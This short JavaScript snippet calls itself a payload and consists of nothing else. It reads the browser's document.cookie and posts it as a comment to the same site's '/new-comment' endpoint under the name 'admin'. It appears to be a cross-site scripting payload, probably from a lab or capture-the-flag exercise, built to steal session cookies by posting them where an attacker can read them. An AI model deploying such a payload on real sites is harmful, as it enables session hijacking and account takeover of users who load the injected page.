console.log('Payload running')
const data = new URLSearchParams()
data.append('name', 'admin')
data.append('comment', 'comment' + document.cookie)
fetch('/new-comment', {
  method: 'POST',
  body: data
})
console.log('Payload finished')
